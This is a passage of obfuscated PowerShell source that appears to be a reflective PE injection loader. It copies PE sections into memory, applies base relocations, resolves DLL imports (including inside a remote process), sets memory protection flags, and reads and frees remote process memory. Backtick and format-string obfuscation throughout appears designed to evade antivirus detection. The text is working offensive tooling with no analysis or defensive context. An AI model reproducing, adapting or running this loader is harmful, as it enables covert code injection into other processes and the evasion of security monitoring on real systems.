		if (${Re`S`Ult} -ne 0)
		{
			Throw ("{13}{3}{14}{1}{6}{8}{9}{2}{4}{12}{16}{7}{5}{10}{15}{0}{11}"-f 'cAddress faile','teRemo','e','ll','ad','all G','t','o c','e','Thr','e','d.',' ','Ca',' to Crea','tPro','t')
		}
		
		
		[IntPtr]${REtU`Rnv`Al`M`em} =  (varIABLE  Lism5T).Value::("{3}{0}{2}{1}" -f 'b','l','a','AllocHGlo').Invoke(${PTr`Si`ze})
		${Re`SU`LT} = ${wI`N`32fUnCTi`ons}."r`EadPROCe`SSmE`Mo`Ry"."in`VokE"(${Remot`EP`R`oCHa`N`DLE}, ${GE`TPRo`CA`dDreSSre`TMEM}, ${re`TURn`V`ALMEm}, [UIntPtr][UInt64]${P`TRsi`Ze}, [Ref]${N`UMBYTE`SwrIT`T`EN})
		if ((${rE`sulT} -eq ${FA`L`se}) -or (${num`Byt`eswRITT`eN} -eq 0))
		{
			Throw ("{5}{2}{4}{1}{3}{0}"-f 'iled','ry','all to ReadProces',' fa','sMemo','C')
		}
		[IntPtr]${Pr`oCadDre`SS} =   ( GET-vArIAbLE  liSm5t  ).vaLUe::"pTR`TOS`TrUcTURe"(${REt`U`Rnv`Almem}, [Type][IntPtr])

        
		${Win32F`UN`c`TIONs}."V`iRtuaLfRe`eEX"."Invo`Ke"(${rEm`ot`ePRO`chAndle}, ${RSca`D`Dr}, [UIntPtr][UInt64]0, ${WIN32`COnS`Tan`TS}."mEM_`Rele`Ase") | &("{2}{1}{0}"-f 'Null','t-','Ou')
		${WIN3`2F`UNct`ioNs}."v`irtUaLfRE`E`eX"."I`NV`OKe"(${reMOt`EproCHA`N`dLE}, ${gET`Pr`oCad`D`RESS`RetMEm}, [UIntPtr][UInt64]0, ${Win`32CONSTa`N`Ts}."mEm`_rele`Ase") | &("{0}{1}{2}"-f 'Out','-Nul','l')

        if (-not ${LoA`dbYoRdIn`AL})
        {
            ${wiN32f`U`Nc`TIOns}."vI`RTUalFR`eeeX"."iNvO`KE"(${rEm`OTeP`R`ochandLE}, ${RFUNcNa`M`ePTR}, [UIntPtr][UInt64]0, ${WiN3`2cOnStA`Nts}."meM_`ReL`E`ASe") | &("{1}{0}"-f 'ut-Null','O')
        }
		
		return ${p`RoCAD`dr`eSS}
	}


	Function Co`py-`sECTiONs
	{
		Param(
		[Parameter(POSItioN = 0, mANDatoRY = ${TR`Ue})]
		[Byte[]]
		${Peb`ytEs},
		
		[Parameter(POSitioN = 1, MandaTORy = ${T`Rue})]
		[System.Object]
		${pE`iN`Fo},
		
		[Parameter(PoSiTiON = 2, MaNdaTory = ${Tr`Ue})]
		[System.Object]
		${wIN32`FUn`c`TIoNS},
		
		[Parameter(PoSitIon = 3, mAnDATORy = ${t`RUE})]
		[System.Object]
		${wIN32t`Yp`Es}
		)
		
		for( ${I} = 0; ${i} -lt ${pE`INFO}."I`M`AGe_nT_h`eAderS"."Fil`e`He`ADer"."Nu`mBErOfSEC`T`Io`NS"; ${I}++)
		{
			[IntPtr]${sEC`TiOnHea`derp`Tr} = [IntPtr](&("{1}{3}{4}{2}{0}" -f 'ed','Add-','AsUnsign','Signe','dInt') ([Int64]${p`ein`Fo}."sEcTIoNH`ead`E`Rp`TR") (${I} *  (  get-vAriabLe  LISm5T -vaLUe)::"Si`ZEOf"([Type]${WIN3`2`TypeS}."iMAG`E_`Se`Ct`I`on_h`EADeR")))
			${s`ECti`Onhe`ADER} =   (  vAriABlE  ("Lis"+"M5t") ).vALuE::"pT`R`TostRuctUre"(${sECTION`heADe`RP`TR}, [Type]${wi`N32`Ty`PEs}."ima`Ge`_SECT`Io`N_hea`D`ER")
		
			
			[IntPtr]${Sect`iOND`ES`TaD`dR} = [IntPtr](&("{1}{4}{2}{6}{0}{3}{5}"-f'nt','Add-','ign','AsUns','S','igned','edI') ([Int64]${PE`i`Nfo}."Peh`An`DlE") ([Int64]${sECT`IonHE`AdeR}."vI`RtuAlAd`dRESs"))
			
			
			
			
			
			${sIZEo`FR`AW`daTA} = ${SectIOnh`Ea`der}."sIZE`oFRaWdA`Ta"

			if (${s`EcT`IONhEAD`eR}."POINte`Rt`O`Rawdata" -eq 0)
			{
				${sIZ`e`OfRaw`D`AtA} = 0
			}
			
			if (${sIz`eO`FrAW`D`AtA} -gt ${s`eCTion`H`E`ADER}."ViRTua`l`SIZe")
			{
				${Si`z`eO`FRAWDATA} = ${S`e`cTioNHEader}."v`IR`TuaLSi`ZE"
			}
			
			if (${S`I`zeo`FRAW`DAta} -gt 0)
			{
				&("{3}{2}{0}{4}{1}"-f 'y','ngeValid','st-Memor','Te','Ra') -DebugString ("{4}{2}{3}{1}{0}{5}" -f'op','MarshalC','opy-Sections','::','C','y') -PEInfo ${PEI`N`FO} -StartAddress ${SEctIo`Nd`Estad`DR} -Size ${SIzeO`F`RAWd`A`TA} | &("{1}{0}" -f'-Null','Out')
				 ( VARiablE liSM5T ).valUe::"c`OPy"(${PEB`y`TES}, [Int32]${S`eCTioNh`Eader}."P`OinTErt`or`AWd`ATa", ${S`EcT`Io`NDeS`TaDDR}, ${sIZ`E`o`FRA`WDATA})
			}
		
			
			if (${S`ectiONHEa`dEr}."sizE`OFRAwD`AtA" -lt ${s`e`ctio`NHe`AdER}."v`IrtU`ALsI`ze")
			{
				${di`Ff`eREN`ce} = ${SECT`iONHE`Ad`ER}."vir`T`UalsIZE" - ${sIz`EO`FR`AW`Data}
				[IntPtr]${star`T`A`DdRess} = [IntPtr](&("{2}{0}{3}{4}{5}{1}" -f 'dd-Si','ned','A','gn','e','dIntAsUnsig') ([Int64]${SeCtI`OnD`Es`TAddr}) ([Int64]${SiZeOfr`AWd`ATA}))
				&("{3}{4}{5}{1}{2}{0}" -f 'id','g','eVal','Test-','Memory','Ran') -DebugString ("{1}{5}{0}{3}{4}{2}"-f 'Sec','C','mset','tion','s::Me','opy-') -PEInfo ${PE`i`NFO} -StartAddress ${st`ARTADdR`esS} -Size ${DI`F`Fer`eNcE} | &("{1}{0}{2}" -f 'u','O','t-Null')
				${WI`N32`F`UNctIOns}."mE`MSet"."in`VO`KE"(${sTa`RTA`DdR`ess}, 0, [IntPtr]${dI`Ff`EreN`Ce}) | &("{1}{2}{0}"-f'l','Out','-Nul')
			}
		}
	}


	Function U`PDate`-mE`mOR`YAD`d`RESSES
	{
		Param(
		[Parameter(PosItIOn = 0, MAnDatOry = ${T`RUE})]
		[System.Object]
		${PEIN`FO},
		
		[Parameter(pOSItiOn = 1, MaNDatORy = ${T`RUe})]
		[Int64]
		${o`Ri`giNaL`iMAGebASe},
		
		[Parameter(POSiTIOn = 2, MaNDatORy = ${t`RUe})]
		[System.Object]
		${wi`N`3`2conSTaNTs},
		
		[Parameter(position = 3, mandaTOrY = ${T`RuE})]
		[System.Object]
		${w`i`N3`2typES}
		)
		
		[Int64]${B`AS`EdIfF`eRE`Nce} = 0
		${AD`DDI`FFer`EncE} = ${TR`UE} 
		[UInt32]${ima`GeBa`seR`eL`oC`sIZE} =   (  get-iteM VarIAbLE:LISM5T ).VaLUE::"si`Z`eOF"([Type]${W`In32tY`pES}."Im`Ag`E_BasE`_REL`oC`AT`ioN")
		
		
		if ((${o`RIgi`NaLI`maGEBAsE} -eq [Int64]${P`E`INFO}."e`FfEcTiV`ep`EHANd`lE") `
				-or (${pe`I`NFO}."imA`g`E_nT_H`EaderS"."opT`i`OnALhE`AdeR"."bA`sErE`locaT`I`onTabLe"."S`ize" -eq 0))
		{
			return
		}


		elseif ((&("{2}{0}{1}{7}{5}{6}{3}{4}" -f 'e-Va','l1','Compar','Va','l2AsUInt','rTha','n','Greate') (${Ori`gIn`A`lImagE`B`ASE}) (${p`EiN`FO}."e`F`FE`CTiV`E`PehANdle")) -eq ${T`RuE})
		{
			${B`A`s`EdIffE`RENcE} = &("{2}{3}{1}{0}"-f'sUnsigned','A','Sub-Sign','edInt') (${Or`ig`inAliMa`G`eBaSe}) (${p`e`inFo}."e`FFECT`ive`p`EhAndle")
			${a`dddiFFE`Re`N`ce} = ${Fa`lSE}
		}
		elseif ((&("{4}{7}{2}{1}{0}{3}{5}{6}" -f'hanV','rT','e','al2A','Co','sUIn','t','mpare-Val1Great') (${PEIN`FO}."efFeCTi`Ve`pE`ha`N`dlE") (${oRI`gInAlim`AgeB`ASe})) -eq ${tR`UE})
		{
			${BasED`iff`ERe`NCE} = &("{6}{5}{4}{2}{1}{0}{3}" -f 'e','tAsUnsign','n','d','nedI','ub-Sig','S') (${Pei`N`FO}."EfFE`C`TIV`ePEHaNdle") (${Or`IGiNaLima`G`EBAsE})
		}
		
		
		[IntPtr]${ba`sErELO`CPtr} = [IntPtr](&("{3}{0}{4}{6}{1}{5}{2}"-f'i','IntAsUns','ned','Add-S','gne','ig','d') ([Int64]${P`EInFo}."P`eh`ANDle") ([Int64]${P`eiNfo}."imagE_`N`T_hEaderS"."OP`Tio`NaLhEa`D`er"."baS`EreLOcatiON`T`AB`le"."v`IrtU`ALAdd`Ress"))
		while(${Tr`Ue})
		{
			
			${b`As`eReL`OCAT`I`ONTAB`Le} =   (get-iteM  ('variablE:l'+'Is'+'M5'+'T')).vALue::"P`TrToSTRUc`TurE"(${Ba`s`e`RELocPTR}, [Type]${w`in32`T`yPes}."iMa`ge_BA`Se_REL`OcATION")

			if (${baSeR`e`LoCa`T`IoNtABLe}."sIZEof`BL`o`ck" -eq 0)
			{
				break
			}

			[IntPtr]${MeM`AdDRBa`Se} = [IntPtr](&("{1}{2}{4}{3}{6}{5}{0}" -f 'ned','A','dd','ignedI','-S','AsUnsig','nt') ([Int64]${PEI`N`FO}."p`E`HAnDlE") ([Int64]${B`A`sErelOCA`TioNtABle}."VIRtUA`LAddR`ESs"))
			${NU`M`RE`L`OCATionS} = (${basErElO`c`AtI`OnTabLe}."sI`z`eOFbL`OcK" - ${ImAg`EBaSER`E`LOCSiZE}) / 2

			
			for(${I} = 0; ${I} -lt ${n`UMRELo`cA`TiOnS}; ${I}++)
			{
				
				${r`ELOcA`TiOni`NfO`PtR} = [IntPtr](&("{4}{3}{5}{1}{2}{0}"-f 'AsUnsigned','n','t','ig','Add-S','nedI') ([IntPtr]${BA`SErE`loCpTr}) ([Int64]${imA`g`ebAsEr`eLo`cSIZe} + (2 * ${I})))
				[UInt16]${REL`OCA`TioNinFO} =  ${l`I`sm5T}::"P`TrTosTRU`CT`URE"(${r`eL`OcATiO`NInFOP`Tr}, [Type][UInt16])

				
				[UInt16]${RE`l`OcoFf`Set} = ${relo`caTioNI`NfO} -band 0x0FFF
				[UInt16]${r`Elo`CtYPE} = ${Re`l`OCat`I`oNinfO} -band 0xF000
				for (${j} = 0; ${J} -lt 12; ${j}++)
				{
					${Relo`cT`ype} =   (vArIABLe  YOln  -VaLUEonl  )::("{0}{1}"-f'Flo','or').Invoke(${R`eLoCt`y`pE} / 2)
				}

				
				
				
				if ((${REL`Oc`TyPE} -eq ${Win3`2`cO`N`StANtS}."i`MagE`_`R`el_`B`AseD_highLoW") `
						-or (${re`LoCty`pE} -eq ${wiN32`C`oNSta`Nts}."IMA`ge`_`ReL_BAseD`_dir64"))
				{			
					
					[IntPtr]${FinAL`A`ddR} = [IntPtr](&("{0}{2}{1}{4}{3}{6}{5}" -f 'Add-','gnedI','Si','tA','n','signed','sUn') ([Int64]${m`eMA`ddR`BASE}) ([Int64]${RELocOF`F`SeT}))
					[IntPtr]${cU`RRaddR} =   ( ChIlDiTEm vaRiAblE:lISm5t  ).VALuE::"pTRTOS`TrUc`TuRE"(${f`iNa`lADdr}, [Type][IntPtr])
		
					if (${A`D`DdiFf`ERe`NCE} -eq ${TR`UE})
					{
						[IntPtr]${CurR`AD`Dr} = [IntPtr](&("{4}{1}{0}{3}{2}"-f'-Signed','dd','tAsUnsigned','In','A') ([Int64]${cuRra`d`dR}) (${bA`SEdIfFEr`e`NCe}))
					}
					else
					{
						[IntPtr]${CUr`R`Addr} = [IntPtr](&("{4}{7}{0}{5}{1}{2}{3}{6}" -f'Sig','tA','s','Unsign','Su','nedIn','ed','b-') ([Int64]${cu`RRa`dDR}) (${baS`eD`iFfEren`cE}))
					}				

					  (  GeT-VariaBLe ('LIS'+'m'+'5t')  -VAlUEonLy )::("{2}{1}{4}{3}{0}"-f 'r','ruc','St','oPt','tureT').Invoke(${CUrraD`DR}, ${F`INalA`DDR}, ${Fa`LSE}) | &("{2}{0}{1}" -f 'ut-Nul','l','O')
				}
				elseif (${Re`lO`ctype} -ne ${W`in32COns`TANTS}."ima`g`E_`R`el_BASe`D_ABs`oLuTE")
				{
					
					Throw ('Un'+'kn'+'own '+'reloc'+'at'+'i'+'on '+'fo'+'und, '+'rel'+'ocati'+'on'+' '+'value'+': '+"$RelocType, "+'re'+'loc'+'ation'+'info: '+"$RelocationInfo")
				}
			}
			
			${b`ASe`RELoCp`TR} = [IntPtr](&("{3}{2}{0}{1}{4}" -f'AsUns','i','gnedInt','Add-Si','gned') ([Int64]${bAsE`R`E`LOCPtR}) ([Int64]${B`AS`E`RELOCa`T`io`NTABLE}."sI`zEO`FbL`OCk"))
		}
	}


	Function i`mpoRT-DlL`iMp`orTs
	{
		Param(
		[Parameter(posITIOn = 0, mAndaToRY = ${TR`Ue})]
		[System.Object]
		${PEI`NFo},
		
		[Parameter(posITION = 1, MAnDATORy = ${TR`UE})]
		[System.Object]
		${W`IN32F`U`Nct`ions},
		
		[Parameter(POSItioN = 2, mandATORY = ${TR`UE})]
		[System.Object]
		${WI`N3`2TYp`Es},
		
		[Parameter(POsITion = 3, maNdAtOrY = ${T`RuE})]
		[System.Object]
		${wiN`32cONS`T`A`Nts},
		
		[Parameter(POsITIon = 4, ManDaTORy = ${f`AL`Se})]
		[IntPtr]
		${rEMOTepRoc`hA`ND`LE}
		)
		
		${rEMOTE`lO`A`D`ING} = ${f`AlSE}
		if (${peI`N`Fo}."pe`HAnd`lE" -ne ${pE`in`FO}."eFfECT`ivep`E`hAndLe")
		{
			${r`EmoTeL`o`AdInG} = ${Tr`Ue}
		}
		
		if (${PEIN`FO}."Im`A`G`E_Nt_`HEADeRS"."Op`T`iOnAl`hEADER"."Imp`OrtT`A`Ble"."si`Ze" -gt 0)
		{
			[IntPtr]${IM`P`O`Rtd`eSCRI`ptorPTr} = &("{4}{3}{0}{6}{1}{2}{5}"-f'g','tA','sU','d-Si','Ad','nsigned','nedIn') ([Int64]${p`eI`NFO}."Pe`hAn`DlE") ([Int64]${pEi`N`Fo}."Im`AG`e`_`NT_hEAD`ERs"."o`pTiON`AlHEAD`ER"."impo`R`TtablE"."VIrT`U`ALA`Dd`RESs")
			
			while (${t`RuE})
			{
				${IMPorT`deSc`R`IPT`or} =   (  vARiabLE  ("liSm"+"5T") ).valUe::"P`TR`T`OsTructu`RE"(${iMPOr`T`dEsCR`I`PtorPtR}, [Type]${w`In`32TyPeS}."iMAGe_im`P`Ort_`dESC`RIpT`or")
				
				
				if (${iMpO`R`TDEsc`RIPt`oR}."c`HArac`T`ErISTICS" -eq 0 `
						-and ${ImpOR`TD`eSCrIp`TOR}."FIR`STT`hu`NK" -eq 0 `
						-and ${Impo`R`TDEsC`RIp`Tor}."FORWAR`d`erchAiN" -eq 0 `
						-and ${i`mpOR`TDES`cRI`ptOr}."nA`mE" -eq 0 `
						-and ${iM`PoRTDEsCrI`Pt`or}."ti`mEda`TESt`A`MP" -eq 0)
				{
					&("{0}{3}{2}{1}"-f 'Writ','e','bos','e-Ver') ("{5}{3}{2}{4}{1}{0}{7}{6}" -f ' DLL','g','t','por','in','Done im','imports',' ')
					break
				}

				${iMPor`T`dL`LhANd`Le} =  (GET-chiLdITem ("Va"+"r"+"IAbLE:8z"+"H")  ).VaLUe::"Z`erO"
				${im`POr`TdLL`PAt`h`PtR} = (&("{5}{3}{4}{1}{0}{2}" -f'n','g','ed','-SignedIntAsUn','si','Add') ([Int64]${pEi`N`FO}."PE`HAN`dLE") ([Int64]${IMPortdE`Sc`R`iptor}."N`AmE"))
				${i`mpOrt`dLlPA`TH} =  ( vaRiAbLe ("Li"+"Sm5"+"T")).VAlUE::("{3}{0}{2}{1}"-f 'St','gAnsi','rin','PtrTo').Invoke(${IMp`orT`dl`L`patHpTR})
				
				if (${rEmOTeLOAD`I`NG} -eq ${T`RUE})
				{
					${Im`p`ORTDl`LHAnD`lE} = &("{2}{0}{4}{3}{1}"-f 'rt-DllInR','rocess','Impo','P','emote') -RemoteProcHandle ${rEMOTEP`R`o`chAndlE} -ImportDllPathPtr ${imp`o`RTdLLpA`T`HPtr}
				}
				else
				{
					${im`PortD`lLh`A`NdlE} = ${WIN`32fUN`CtIo`Ns}."LO`ADLIBrA`Ry"."I`NVOKe"(${IMp`o`R`TD`LLpaTh})
				}

				if ((${imP`ortd`LlHa`NdlE} -eq ${NU`ll}) -or (${iM`POrTdlL`h`AnD`le} -eq  ( GI ("v"+"ariA"+"b"+"LE:8Zh")  ).VaLUe::"z`ERo"))
				{
					throw ('Erro'+'r'+' '+'import'+'ing'+' '+'DL'+'L, '+'D'+'LLNam'+'e: '+"$ImportDllPath")
				}
				
				
				[IntPtr]${th`UN`kREF} = &("{4}{2}{1}{5}{3}{0}"-f'igned','igne','S','IntAsUns','Add-','d') (${pEi`NFo}."p`E`hAnDLe") (${ImPO`R`TdesCRiPT`Or}."Fir`st`THUNk")
				[IntPtr]${or`i`g`iNalthun`k`Ref} = &("{4}{0}{5}{6}{3}{1}{2}" -f'S','tAs','Unsigned','dIn','Add-','i','gne') (${PEiN`FO}."PE`H`ANdlE") (${i`MpOrTdEsCRI`P`Tor}."c`HArAC`T`ErISTI`Cs") 
				[IntPtr]${Or`iGI`Na`lTh`UN`Kr`EfVal} =   (  Get-chilDiTEM  ("vArIA"+"BlE:l"+"IS"+"m"+"5T")  ).VaLuE::"pTrto`sT`RUc`TURe"(${ORiG`inaLth`UnK`REF}, [Type][IntPtr])
				
				while (${o`Ri`GiNa`l`Th`UnKreFV`AL} -ne   ( cHiLdITEM  vArIAblE:8zh  ).vALuE::"z`Ero")
				{
                    ${l`o`ADBYORD`I`Nal} = ${F`ALsE}
                    [IntPtr]${p`RoC`eD`UReNAmeP`TR} =  (  get-VARiABLE 8zh).vaLuE::"ZE`RO"
					
					
					
					[IntPtr]${NEW`T`h`UnkrEf} =  (gI  vARIAblE:8Zh  ).VaLuE::"z`ero"
					if( ${Li`Sm`5T}::"s`IZeOf"([Type][IntPtr]) -eq 4 -and [Int32]${or`iGi`NAlThuNKr`EFV`Al} -lt 0)
					{
						[IntPtr]${ProCE`d`U`RenAmEP`TR} = [IntPtr]${OR`iGinalTh`UNKR`eFVaL} -band 0xffff 
                        ${l`o`AdB`YoRDI`NAL} = ${tr`Ue}
					}
                    elseif( ( LS  vArIABLE:liSM5T  ).VALUe::"SiZE`of"([Type][IntPtr]) -eq 8 -and [Int64]${o`RiGi`NA`lthuNkREfVaL} -lt 0)
					{
						[IntPtr]${PrOC`EDU`Re`NamePtR} = [Int64]${ORIGINaL`ThU`NK`REF`VaL} -band 0xffff 
                        ${L`OAdbyoRd`i`NAl} = ${tR`UE}
					}
					else
					{
						[IntPtr]${s`TRInGA`d`Dr} = &("{2}{0}{3}{5}{4}{1}" -f 'd-','gned','Ad','Signed','i','IntAsUns') (${pE`I`NFO}."P`E`hANDle") (${ORI`Ginal`ThuNkr`e`FVAL})
						${StRIN`G`AdDR} = &("{4}{6}{1}{5}{2}{0}{3}" -f 'Un','S','IntAs','signed','Add','igned','-') ${s`TRI`N`GADdr} (  (  gET-VARIaBLE  LiSm5T -valUe)::"si`Z`eof"([Type][UInt16]))
						${Pr`oceDUrE`N`Ame} =   ${lISM`5T}::("{3}{2}{1}{4}{0}"-f 'ngAnsi','Str','rTo','Pt','i').Invoke(${St`RiNga`ddr})
                        ${proCe`D`Ur`eNAMePtr} =   ( VArIABLe  ('lIs'+'m'+'5t')  -VAlueonLY  )::("{2}{0}{3}{1}"-f'tringT','i','S','oHGlobalAns').Invoke(${prOc`e`DU`R`eNAmE})
					}
					
					if (${r`em`Ot`EloadING} -eq ${T`RUE})
					{
						[IntPtr]${N`eWt`huNk`REF} = &("{2}{1}{5}{3}{4}{0}"-f'ess','emot','Get-R','ocAdd','r','ePr') -RemoteProcHandle ${r`E`Mo`TEp`RoChAnDLE} -RemoteDllHandle ${IMPOR`TdLL`HA`NdLE} -FunctionNamePtr ${p`ROce`dU`Re`N`AmeptR} -LoadByOrdinal ${Loa`dby`ORD`inaL}
					}
					else
					{
				        [IntPtr]${n`E`Wth`UNKreF} = ${WIN32`FUnc`TIons}."GE`TpROCAdDr`ESS`Int`P`TR"."In`VO`Ke"(${IMP`OR`TD`lLhANdLe}, ${procE`D`UreNa`m`Ep`TR})
					}
					
					if (${NEwTHU`Nkr`ef} -eq ${NU`lL} -or ${NE`wth`U`NKReF} -eq   ( Dir  ('v'+'a'+'r'+'IaBLE:8Zh')).vaLUe::"z`Ero")
					{
                        if (${lo`A`dbYOrdiNaL})
                        {
                            Throw ('New'+' '+'f'+'unct'+'ion '+'re'+'fere'+'nce '+'is'+' '+'nu'+'l'+'l, '+'th'+'is '+'is'+' '+'almos'+'t '+'cer'+'tainl'+'y '+'a '+'bug'+' '+'i'+'n '+'this'+' '+'script'+'. '+'F'+'uncti'+'on '+'Ord'+'inal'+': '+"$ProcedureNamePtr. "+'Dll'+': '+"$ImportDllPath")
                        }
                        else
                        {
						    Throw ('New'+' '+'func'+'t'+'ion'+' '+'r'+'efe'+'renc'+'e '+'i'+'s '+'n'+'ull, '+'t'+'his '+'is'+' '+'alm'+'os'+'t '+'c'+'ert'+'ainly '+'a '+'b'+'ug '+'in'+' '+'t'+'his '+'sc'+'r'+'ipt. '+'Funct'+'io'+'n: '+"$ProcedureName. "+'Dl'+'l: '+"$ImportDllPath")
                        }
					}

					 ${lis`M`5t}::("{1}{2}{3}{0}" -f'reToPtr','S','truct','u').Invoke(${NeWthu`N`krEf}, ${t`Hu`NKrEF}, ${fal`SE})
					
					${tHuNK`R`ef} = &("{0}{3}{2}{1}{4}" -f'Add-','dIntAsUn','gne','Si','signed') ([Int64]${tHU`N`kreF}) ( (  Get-CHIldITem ('vARIA'+'bLe:LIS'+'M'+'5'+'t')  ).vAlUe::"sI`z`eof"([Type][IntPtr]))
					[IntPtr]${oRi`GInaLTHUnK`R`EF} = &("{3}{1}{5}{2}{4}{0}"-f'sUnsigned','dd-Sig','dIn','A','tA','ne') ([Int64]${oRI`g`i`NALTh`UnkreF}) ( ${Li`sm5T}::"sI`ZeOF"([Type][IntPtr]))
					[IntPtr]${O`RIg`inaLt`h`UN`KRefVaL} =  ( DIr VaRiAbLE:lisM5T  ).VAluE::"pT`RTos`TR`UctuRe"(${or`I`GinAlThunK`R`ef}, [Type][IntPtr])

                    
                    
                    if ((-not ${L`o`ADb`yord`iNal}) -and (${proc`EDur`EnAME`pTR} -ne   ${8`Zh}::"z`ErO"))
                    {
                          ( VarIAble  ("LiSM"+"5"+"t")).VAlUE::("{1}{2}{0}" -f'bal','Fr','eeHGlo').Invoke(${PROcedU`R`ENA`mE`P`TR})
                        ${prOcE`Du`R`E`NaMePtr} =   ${8`zh}::"Z`ero"
                    }
				}
				
				${I`MPOrTD`eSC`RipTO`Rp`Tr} = &("{0}{1}{3}{2}" -f'A','d','gned','d-SignedIntAsUnsi') (${imP`orTde`Sc`RIpT`oRptr}) (  (ChiLditem  ("vA"+"R"+"IA"+"Ble:"+"lism5t")).vAluE::"s`izeoF"([Type]${WiN`32`T`yPEs}."imAGE_iMPO`R`T_d`eS`cRiP`Tor"))
			}
		}
	}

	Function GET-v`IRT`Ua`lprOtECTVal`Ue
	{
		Param(
		[Parameter(PoSItiON = 0, mAnDATORy = ${t`RuE})]
		[UInt32]
		${s`E`CtioNChA`RaC`TeriStIcs}
		)
		
		${Pro`TEc`Ti`oNfL`AG} = 0x0
		if ((${s`Ecti`oN`CharaC`TeRI`StI`cS} -band ${w`IN32conSTA`NTs}."Im`AGe_scn_`M`e`M_`EXEc`UTE") -gt 0)
		{
			if ((${SE`C`Ti`o`NC`Har`ActerIsTi`cs} -band ${win32Co`Ns`TAN`TS}."iM`A`gE_sCn`_me`M_reaD") -gt 0)
			{
				if ((${sE`CTIon`CHArAC`T`ErisTiCs} -band ${wI`N32c`o`N`STANtS}."ima`GE_S`cn_me`m_WRite") -gt 0)
				{
					${proTeC`TiOn`F`lAg} = ${WIN3`2`Co`NsTANtS}."pAGe`_EXECut`e_`ReA`D`wRItE"
				}
				else
				{
					${P`RO`TE`CTIonFlag} = ${WIn`32CoNSt`A`N`TS}."pAg`e_`e`xeCUtE_rEaD"
				}
			}
			else
			{
				if ((${s`EcT`ion`CH`ArACTerI`STi`cs} -band ${w`In3`2C`onsT`ANts}."iM`AGe_`s`CN`_meM_wriTE") -gt 0)
				{
					${PR`Ot`ECTIO`Nfl`Ag} = ${WI`N32C`ONstA`Nts}."page`_E`Xe`cUTe`_WR`I`TecoPY"
				}
				else
				{
					${p`R`oteC`TiOnflAg} = ${WiN`32co`Ns`Tan`Ts}."Page`_EXE`C`UtE"
				}
			}
		}
		else
		{
			if ((${S`ECt`iOnchA`RA`Cte`RIST`ICS} -band ${W`IN3`2cONSt`AnTs}."Im`AgE_sCn`_M`em_reaD") -gt 0)
			{
				if ((${sE`ctioNcH`A`Racter`isTiCs} -band ${W`IN32`CONStaNTs}."I`MAGe_`SCn_`M`EM`_wRITe") -gt 0)
				{
					${PROTEc`TiO`Nflag} = ${Wi`N32C`o`NsTA`NtS}."PaGE_`R`e`ADWrITE"
				}
				else
				{
					${pRot`ec`Tio`NF`LaG} = ${WIn32C`Ons`T`A`NTS}."PAge_r`e`AD`On`ly"
				}
			}
			else
			{
				if ((${SECt`ioNC`Ha`RaCt`ER`isT`Ics} -band ${w`iN32C`oNsT`Ants}."I`Mage`_SCN_M`eM_Wr`Ite") -gt 0)
				{
					${pro`TeCTio`Nfl`Ag} = ${w`In32coNS`TAnTs}."pAgE_Wr`i`TEc`opY"
				}
				else
				{
					${p`Rotec`TIonFLaG} = ${WIN32con`sT`An`TS}."p`Age_N`O`Ac`cEss"
				}
			}
		}
		
		if ((${seCtiONc`Ha`Racte`RISt`ICs} -band ${W`in32`C`o`NSTANTs}."iM`Ag`E_ScN_Mem_NOt`_`c`ACHeD") -gt 0)
		{
			${pR`OtEc`TIo`NFl`Ag} = ${p`Ro`TECti`oNFL`AG} -bor ${wIN32c`ONs`Ta`Nts}."pAge`_`N`oCAchE"
		}
		
		return ${protECT`I`O`Nf`laG}
	}

	Function UpDaTE`-`MEmo`RYprot`e`ctio`NFLa`Gs
	{
		Param(
		[Parameter(POsItiON = 0, mAnDATORY = ${tr`UE})]
		[System.Object]
		${PEI`N`Fo},
		
		[Parameter(POSITIon = 1, MandAToRy = ${tR`Ue})]
		[System.Object]
		${WiN`32Fu`NCTioNs},
		
		[Parameter(PosiTioN = 2, MandAtOrY = ${Tr`Ue})]
		[System.Object]
		${WIn32Co`Ns`TaNTS},
		
		[Parameter(POsiTIon = 3, MANDATOry = ${T`RUE})]
		[System.Object]
		${wI`N3`2tYp`es}
		)
		
		for( ${i} = 0; ${I} -lt ${PeIn`Fo}."IMag`e_Nt`_HEaDE`RS"."fi`L`ehE`Ader"."n`UmBEr`oF`SECtIONs"; ${i}++)
		{
			[IntPtr]${s`Ect`Ion`heAderPtR} = [IntPtr](&("{0}{6}{3}{1}{2}{5}{4}"-f'A','IntAsUn','si','d','ned','g','dd-Signe') ([Int64]${pE`IN`Fo}."S`EC`Ti`ONHeAdErPTR") (${I} *  (ls ("var"+"ia"+"bl"+"e:lIsm"+"5T")).VAluE::"SI`ZEOF"([Type]${w`In32Ty`p`es}."I`mAgE_S`e`c`TIOn_`H`Eader")))
			${SE`cTIOnH`eaD`ER} =  ( ITEm ('VaRiABLe:l'+'IsM'+'5T')).valUe::"pTrtOst`RUctU`RE"(${sE`cTIoNH`e`ADER`PtR}, [Type]${W`IN3`2tyPes}."imag`E_sECTIO`N_`h`EA`DeR")
			[IntPtr]${S`e`cTio`NptR} = &("{2}{0}{3}{1}{4}"-f'-Signed','ntAsUnsigne','Add','I','d') (${P`eInFO}."peha`NDlE") (${sectiON`h`eaDER}."VI`RTUa`l`ADDRE`Ss")
			
			[UInt32]${pr`OT`ectfLag} = &("{1}{4}{2}{0}{3}"-f 'ualProte','Get-V','rt','ctValue','i') ${sECtIoNhe`A`D`Er}."cHA`Ra`CTe`RiST`ics"
			[UInt32]${SecTI`O`N`SiZE} = ${S`EctiOnH`EaDer}."vir`TUALs`IZe"
			
			[UInt32]${o`ldProTeC`TfLag} = 0
			&("{6}{2}{5}{4}{1}{0}{3}"-f'a','moryR','s','ngeValid','e','t-M','Te') -DebugString ("{5}{9}{8}{0}{6}{3}{7}{1}{4}{2}" -f 'mory','gs::V','alProtect','ctio','irtu','Upda','Prote','nFla','e','te-M') -PEInfo ${pe`INFo} -StartAddress ${Sec`T`I`oNpTr} -Size ${S`e`ctioNSiZE} | &("{1}{0}{2}"-f't-N','Ou','ull')
			${SUC`c`ESs} = ${wiN32`Fu`NcTIOnS}."vIrT`UA`LProTeCT"."I`NV`OKe"(${sEct`io`N`pTR}, ${s`E`CTion`Size}, ${Pr`O`TecT`FLaG}, [Ref]${Oldprot`eCtfL`Ag})
			if (${S`Ucc`EsS} -eq ${f`ALSE})
			{
				Throw ("{6}{5}{7}{3}{4}{0}{10}{1}{9}{8}{2}"-f'c','nge','otection','t','o ','le','Unab',' ','emory pr',' m','ha')
			}
		}
	}
	
	
	
	Function U`p`datE-`E`xe`FUNctIoNS
	{
		Param(
		[Parameter(posItion = 0, mANDATOry = ${t`Rue})]
		[System.Object]
		${PEin`Fo},
		
